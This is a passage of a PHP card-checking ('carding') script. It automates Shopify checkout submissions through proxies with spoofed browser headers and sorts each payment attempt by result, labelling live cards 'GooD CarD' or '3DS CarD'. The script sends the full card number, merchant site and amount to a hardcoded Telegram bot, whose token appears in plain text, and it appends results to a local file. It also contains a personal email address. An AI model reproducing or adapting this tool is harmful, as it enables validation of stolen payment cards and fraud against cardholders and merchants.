                        ],
                        'tip' => [
                            'tipLines' => []
                        ],
                        'taxes' => [
                            'proposedAllocations' => null,
                            'proposedTotalAmount' => [
                                'value' => [
                                    'amount' => $tax,
                                    'currencyCode' => 'USD'
                                ]
                            ],
                            'proposedTotalIncludedAmount' => null,
                            'proposedMixedStateTotalAmount' => null,
                            'proposedExemptions' => []
                        ],
                        'note' => [
                            'message' => null,
                            'customAttributes' => []
                        ],
                        'localizationExtension' => [
                            'fields' => []
                        ],
                        'nonNegotiableTerms' => null,
                        'scriptFingerprint' => [
                            'signature' => null,
                            'signatureUuid' => null,
                            'lineItemScriptChanges' => [],
                            'paymentScriptChanges' => [],
                            'shippingScriptChanges' => []
                        ],
                        'optionalDuties' => [
                            'buyerRefusesDuties' => false
                        ]
                    ],
                    'attemptToken' => $checkoutToken,
                    'metafields' => [],
                    'analytics' => [
                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                        'pageId' => $stable_id
                    ]
                ],
                'operationName' => 'SubmitForCompletion'
            ]);
}
elseif ($currencycode == 'USD') {
    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
            'variables' => [
                'input' => [
                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $address,
                                        'address2' => '',
                                        'city' => $city_us,
                                        'countryCode' => 'US',
                                        'postalCode' => $zip_us,
                                        'firstName' => $firstname,
                                        'lastName' => $lastname,
                                        'zoneCode' => $state_us,
                                        'phone' => $phone,
                                        'oneTimeUse' => false,
                                        'coordinates' => [
                                            'latitude' => $lat,
                                            'longitude' => $lon
                                        ]
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => $handle,
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING',
                                    'LOCAL'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $delamount,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => []
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $minPrice,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $address,
                                                'address2' => '',
                                                'city' => $city_us,
                                                'countryCode' => 'US',
                                                'postalCode' => $zip_us,
                                                'firstName' => $firstname,
                                                'lastName' => $lastname,
                                                'zoneCode' => $state_us,
                                                'phone' => $phone
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => $totalamt,
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'dueAt' => null
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $address,
                                'address2' => '',
                                'city' => $city_us,
                                'countryCode' => 'US',
                                'postalCode' => $zip_us,
                                'firstName' => $firstname,
                                'lastName' => $lastname,
                                'zoneCode' => $state_us,
                                'phone' => $phone
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => 'US'
                        ],
                        'email' => $email,
                        'emailChanged' => false,
                        'phoneCountryCode' => 'US',
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => 'US'
                        ]
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => $tax,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ]
                ],
                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => $stable_id
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);    
} 
elseif ($currencycode == 'NZD') {
    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
        'variables' => [
            'input' => [
                'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                'discounts' => [
                    'lines' => [],
                    'acceptUnexpectedDiscounts' => true
                ],
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyMatchingConditions' => [
                                    'estimatedTimeInTransit' => [
                                        'any' => true
                                    ],
                                    'shipments' => [
                                        'any' => true
                                    ]
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'NONE'
                            ],
                            'expectedTotalPrice' => [
                                'any' => true
                            ],
                            'destinationChanged' => true
                        ]
                    ],
                    'noDeliveryRequired' => [],
                    'useProgressiveRates' => false,
                    'prefetchShippingRatesStrategy' => null,
                    'supportsSplitShipping' => true
                ],
                'deliveryExpectations' => [
                    'deliveryExpectationLines' => []
                ],
                'merchandise' => [
                    'merchandiseLines' => [
                        [
                            'stableId' => $stable_id,
                            'merchandise' => [
                                'productVariantReference' => [
                                    'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                    'properties' => [],
                                    'sellingPlanId' => null,
                                    'sellingPlanDigest' => null
                                ]
                            ],
                            'quantity' => [
                                'items' => [
                                    'value' => 1
                                ]
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $minPrice,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'lineComponentsSource' => null,
                            'lineComponents' => []
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => '11 Northside Drive',
                                            'address2' => 'Westgate',
                                            'city' => 'Auckland',
                                            'countryCode' => 'NZ',
                                            'postalCode' => '0814',
                                            'firstName' => 'xypher',
                                            'lastName' => 'xd',
                                            'zoneCode' => 'AUK',
                                            'phone' => ''
                                        ]
                                    ],
                                    'cardSource' => null
                                ],
                                'giftCardPaymentMethod' => null,
                                'redeemablePaymentMethod' => null,
                                'walletPaymentMethod' => null,
                                'walletsPlatformPaymentMethod' => null,
                                'localPaymentMethod' => null,
                                'paymentOnDeliveryMethod' => null,
                                'paymentOnDeliveryMethod2' => null,
                                'manualPaymentMethod' => null,
                                'customPaymentMethod' => null,
                                'offsitePaymentMethod' => null,
                                'customOnsitePaymentMethod' => null,
                                'deferredPaymentMethod' => null,
                                'customerCreditCardPaymentMethod' => null,
                                'paypalBillingAgreementPaymentMethod' => null
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => 'NZD'
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => '11 Northside Drive',
                            'address2' => 'Westgate',
                            'city' => 'Auckland',
                            'countryCode' => 'NZ',
                            'postalCode' => '0814',
                            'firstName' => 'xypher',
                            'lastName' => 'xd',
                            'zoneCode' => 'AUK',
                            'phone' => ''
                        ]
                    ]
                ],
                'buyerIdentity' => [
                    'customer' => [
                        'presentmentCurrency' => 'NZD',
                        'countryCode' => 'IN'
                    ],
                    'email' => 'insaneff612@gmail.com',
                    'emailChanged' => false,
                    'phoneCountryCode' => 'IN',
                    'marketingConsent' => [],
                    'shopPayOptInPhone' => [
                        'number' => '',
                        'countryCode' => 'IN'
                    ],
                    'rememberMe' => false
                ],
                'tip' => [
                    'tipLines' => []
                ],
                'taxes' => [
                    'proposedAllocations' => null,
                    'proposedTotalAmount' => [
                        'value' => [
                            'amount' => '0',
                            'currencyCode' => 'NZD'
                        ]
                    ],
                    'proposedTotalIncludedAmount' => null,
                    'proposedMixedStateTotalAmount' => null,
                    'proposedExemptions' => []
                ],
                'note' => [
                    'message' => null,
                    'customAttributes' => []
                ],
                'localizationExtension' => [
                    'fields' => []
                ],
                'nonNegotiableTerms' => null,
                'scriptFingerprint' => [
                    'signature' => null,
                    'signatureUuid' => null,
                    'lineItemScriptChanges' => [],
                    'paymentScriptChanges' => [],
                    'shippingScriptChanges' => []
                ],
                'optionalDuties' => [
                    'buyerRefusesDuties' => false
                ]
            ],
            'attemptToken' => $checkoutToken . '-y4dcjm00nor',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);
}

 else {$postf = json_encode([
 'query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),  
         'variables' => [
             'input' => [
                 'sessionInput' => [
                     'sessionToken' => $x_checkout_one_session_token
                 ],
                 'queueToken' => $queue_token,
                 'discounts' => [
                     'lines' => [],
                     'acceptUnexpectedDiscounts' => true
                 ],
                 'delivery' => [
                     'deliveryLines' => [
                         [
                             'destination' => [
                                 'streetAddress' => [
                                     'address1' => $address,
                                     'address2' => '',
                                     'city' => $city_us,
                                     'countryCode' => 'US',
                                     'postalCode' => $zip_us,
                                     'firstName' => $firstname,
                                     'lastName' => $lastname,
                                     'zoneCode' => $zip_us,
                                     'phone' => $phone,
                                     'oneTimeUse' => false,
                                     'coordinates' => [
                                         'latitude' => $lat,
                                         'longitude' => $lon
                                     ]
                                 ]
                             ],
                             'selectedDeliveryStrategy' => [
                                 'deliveryStrategyByHandle' => [
                                     'handle' => $handle,
                                     'customDeliveryRate' => false
                                 ],
                                 'options' => new stdClass()
                             ],
                             'targetMerchandiseLines' => [
                                 'lines' => [
                                     [
                                         'stableId' => $stable_id
                                     ]
                                 ]
                             ],
                             'deliveryMethodTypes' => [
                                 'SHIPPING',
                                 'LOCAL'
                             ],
                             'expectedTotalPrice' => [
                                 'value' => [
                                     'amount' => $delamount,
                                     'currencyCode' => 'USD'
                                 ]
                             ],
                             'destinationChanged' => false
                         ]
                     ],
                     'noDeliveryRequired' => [],
                     'useProgressiveRates' => false,
                     'prefetchShippingRatesStrategy' => null,
                     'supportsSplitShipping' => true
                 ],
                 'deliveryExpectations' => [
                     'deliveryExpectationLines' => []
                 ],
                 'merchandise' => [
                     'merchandiseLines' => [
                         [
                             'stableId' => $stable_id,
                             'merchandise' => [
                                 'productVariantReference' => [
                                     'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                     'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                     'properties' => [],
                                     'sellingPlanId' => null,
                                     'sellingPlanDigest' => null
                                 ]
                             ],
                             'quantity' => [
                                 'items' => [
                                     'value' => 1
                                 ]
                             ],
                             'expectedTotalPrice' => [
                                 'value' => [
                                     'amount' => $minPrice,
                                     'currencyCode' => 'USD'
                                 ]
                             ],
                             'lineComponentsSource' => null,
                             'lineComponents' => []
                         ]
                     ]
                 ],
                 'payment' => [
                     'totalAmount' => [
                         'any' => true
                     ],
                     'paymentLines' => [
                         [
                             'paymentMethod' => [
                                 'directPaymentMethod' => [
                                     'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                     'sessionId' => $cctoken,
                                     'billingAddress' => [
                                         'streetAddress' => [
                                             'address1' => $address,
                                             'address2' => '',
                                             'city' => $city_us,
                                             'countryCode' => 'US',
                                             'postalCode' => $zip_us,
                                             'firstName' => $firstname,
                                             'lastName' => $lastname,
                                             'zoneCode' => $zip_us,
                                             'phone' => $phone
                                         ]
                                     ],
                                     'cardSource' => null
                                 ],
                                 'giftCardPaymentMethod' => null,
                                 'redeemablePaymentMethod' => null,
                                 'walletPaymentMethod' => null,
                                 'walletsPlatformPaymentMethod' => null,
                                 'localPaymentMethod' => null,
                                 'paymentOnDeliveryMethod' => null,
                                 'paymentOnDeliveryMethod2' => null,
                                 'manualPaymentMethod' => null,
                                 'customPaymentMethod' => null,
                                 'offsitePaymentMethod' => null,
                                 'customOnsitePaymentMethod' => null,
                                 'deferredPaymentMethod' => null,
                                 'customerCreditCardPaymentMethod' => null,
                                 'paypalBillingAgreementPaymentMethod' => null
                             ],
                             'amount' => [
                                 'value' => [
                                     'amount' => $totalamt,
                                     'currencyCode' => 'USD'
                                 ]
                             ],
                             'dueAt' => null
                         ]
                     ],
                     'billingAddress' => [
                         'streetAddress' => [
                             'address1' => $address,
                             'address2' => '',
                             'city' => $city_us,
                             'countryCode' => 'US',
                             'postalCode' => $zip_us,
                             'firstName' => $firstname,
                             'lastName' => $lastname,
                             'zoneCode' => $state_us,
                             'phone' => $phone
                         ]
                     ]
                 ],
                 'buyerIdentity' => [
                     'customer' => [
                         'presentmentCurrency' => 'USD',
                         'countryCode' => 'US'
                     ],
                     'email' => $email,
                     'emailChanged' => false,
                     'phoneCountryCode' => 'US',
                     'marketingConsent' => [],
                     'shopPayOptInPhone' => [
                         'countryCode' => 'US'
                     ]
                 ],
                 'tip' => [
                     'tipLines' => []
                 ],
                 'taxes' => [
                     'proposedAllocations' => null,
                     'proposedTotalAmount' => [
                         'value' => [
                             'amount' => $tax,
                             'currencyCode' => 'USD'
                         ]
                     ],
                     'proposedTotalIncludedAmount' => null,
                     'proposedMixedStateTotalAmount' => null,
                     'proposedExemptions' => []
                 ],
                 'note' => [
                     'message' => null,
                     'customAttributes' => []
                 ],
                 'localizationExtension' => [
                     'fields' => []
                 ],
                 'nonNegotiableTerms' => null,
                 'scriptFingerprint' => [
                     'signature' => null,
                     'signatureUuid' => null,
                     'lineItemScriptChanges' => [],
                     'paymentScriptChanges' => [],
                     'shippingScriptChanges' => []
                 ],
                 'optionalDuties' => [
                     'buyerRefusesDuties' => false
                 ]
             ],
             'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
             'metafields' => [],
             'analytics' => [
                 'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                 'pageId' => $stable_id
             ]
         ],
         'operationName' => 'SubmitForCompletion'
     ]);    
 }
     $totalamt = $firstStrategy->runningTotal->value->amount;
 recipt:
     // sleep(3);
     $ch = curl_init();
  if ($proxy_used) {
      curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
      curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
      if (!empty($proxy_user) && !empty($proxy_pass)) {
          curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
      }
  }
  curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');

 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'accept: application/json',
     'accept-language: en-US',
     'content-type: application/json',
     'origin: '.$urlbase,
     'priority: u=1, i',
     'referer: '.$urlbase.'/',
     'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
     'sec-ch-ua-mobile: ?0',
     'sec-ch-ua-platform: "Windows"',
     'sec-fetch-dest: empty',
     'sec-fetch-mode: cors',
     'sec-fetch-site: same-origin',
     'user-agent: '.$ua,
     'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
     'x-checkout-web-deploy-stage: production',
     'x-checkout-web-server-handling: fast',
     'x-checkout-web-server-rendering: no',
     'x-checkout-web-source-id: ' . $checkoutToken,
 ]);


 curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);

 $response4 = curl_exec($ch);
 //echo "<li>receipt: $response4<li>";
 if (curl_errno($ch)) {
     if ($retryCount < $maxRetries) {
         $retryCount++;
         goto recipt; 
     } else {
         $err = 'cURL error: ' . curl_error($ch);
         $result_data = [
        'Response' => $err,
    ];
    $result_data['ProxyStatus'] = $proxy_status;
    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
    $result = json_encode($result_data);
         send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
         curl_close($ch); // Close after retries are exhausted
         exit;
     }
 }

 $response4js = json_decode($response4);

 if (isset($response4js->data->submitForCompletion->receipt->id)) {
     $recipt_id = $response4js->data->submitForCompletion->receipt->id;
 } elseif (empty($recipt_id)) {
     if ($retryCount < $maxRetries) {
         $retryCount++;
         goto recipt;
     } else {
         $err = 'Receipt ID is empty';
         $result_data = [
        'Response' => $err,
    ];
    $result_data['ProxyStatus'] = $proxy_status;
    $result_data['ProxyIP'] = ($proxy_used ? $proxy_ip : 'N/A');
    $result = json_encode($result_data);
         send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
         curl_close($ch); // Close before exiting
         // echo $response4;
         exit;
     }
 }

 
 
 poll:
 $postf2 = json_encode([
     'query' => extractOperationQueryFromFile('jsonp.php', 'PollForReceipt'),
     'variables' => [
         'receiptId' => $recipt_id,
         'sessionToken' => $x_checkout_one_session_token
     ],
     'operationName' => 'PollForReceipt'
 ]);
 // sleep(3);
 $ch = curl_init();
 if ($proxy_used) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy_ip . ':' . $proxy_port);
     curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
     if (!empty($proxy_user) && !empty($proxy_pass)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_user . ':' . $proxy_pass);
     }
 }
 curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');

 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
'accept: application/json',
'accept-language: en-US',
'content-type: application/json',
'origin: '.$urlbase,
'priority: u=1, i',
'referer: '.$urlbase,
'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua,
'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
'x-checkout-web-build-id: ' . $web_build_id,
'x-checkout-web-deploy-stage: production',
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: no',
'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

$response5 = curl_exec($ch);
// echo "<li>Resp_5: $response5<li>";
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll; 
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result_array = [
        'Response' => $err,
        'ProxyStatus' => $proxy_status,
        'ProxyIP' => ($proxy_used ? $proxy_ip : 'N/A')
    ];
    $result = json_encode($result_array);
    send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
    exit;
}
}
if (strpos($response5, '"__typename":"ProcessingReceipt"') !== false) {
    sleep(2); // Espera 3 segundos antes de reintentar
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        send_final_response(['Response' => 'Error: Max Retries'], $proxy_used, $proxy_ip, $proxy_port);
    }
}
if (strpos($response5, '"__typename":"WaitingReceipt"') !== false) {
    sleep(2); // Espera 3 segundos antes de reintentar
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        send_final_response(['Response' => 'Error: Max Retries'], $proxy_used, $proxy_ip, $proxy_port);
    }
}

// echo "<li>CheckoutUrl: $checkouturl<li>";
$file = "cc_responses.txt";
$handle = fopen($file, "a");
$content = "cc = $cc1\nresponse = $response5\n\n";
$r5js = (json_decode($response5));
$start_time = microtime(true);

function send_telegram_log($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $maxRetries = 3; // Max retries for Telegram message
    $retryCount = 0;

    do {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($result !== false && $http_code == 200) {
            return true; // Success
        }
        $retryCount++;
        sleep(1); // Wait 1 second before retrying
    } while ($retryCount < $maxRetries);

    return false; // Failed after retries
}

if (
strpos($response5, $checkouturl . '/thank_you') ||
strpos($response5, $checkouturl . '/post_purchase') ||
strpos($response5, 'Your order is confirmed') ||
strpos($response5, 'Thank you') ||
strpos($response5, 'ThankYou') ||
strpos($response5, 'thank_you') ||
strpos($response5, 'success') ||
strpos($response5, 'classicThankYouPageUrl') ||
strpos($response5, '"__typename":"ProcessedReceipt"') ||
strpos($response5, 'SUCCESS')
) {
// fwrite($handle, $content);
// fclose($handle);
$err = 'Thank You ' . $totalamt;
$response_type = 'Thank You';
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>GooD CarD 🔥</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> $response_type\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4", "--4937735153", $log_message);
$result = json_encode([
'Response' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1,
]);
send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
exit;
} elseif (strpos($response5, 'CompletePaymentChallenge')) {
$err = '3ds cc';
$log_message = "<b>3DS CarD ⚠️</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> 3DS Challenge\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4", "--4937735153", $log_message);
$result_data = [
'Response' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1,
];
send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
exit;
} elseif (strpos($response5, '/stripe/authentications/')) {
$err = '3ds cc';
$log_message = "<b>3DS CarD ⚠️</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> 3DS Challenge\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4", "--4937735153", $log_message);
$result_data = [
'Response' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1,
];
send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
exit;
}
elseif (isset($r5js->data->receipt->processingError->code)) {
$err = $r5js->data->receipt->processingError->code;
if ($err == 'incorrect_zip') {
$response_type = $err;
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>INCORRECT ZIP ❌</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> $response_type\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8305972211:AAGpfN5uiUMqXCw3KjmF07MN059SMggDGJ4", "--4937735153", $log_message);
}
$result = json_encode([
'Response' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1
]);
send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
exit;
} else {
// fwrite($handle, $content);
// fclose($handle);
$err = 'Response Not Found';
$result_array = [
        'Response' => $err,
        'ProxyStatus' => $proxy_status,
        'ProxyIP' => ($proxy_used ? $proxy_ip : 'N/A')
    ];
    $result = json_encode($result_array);
send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
exit;
}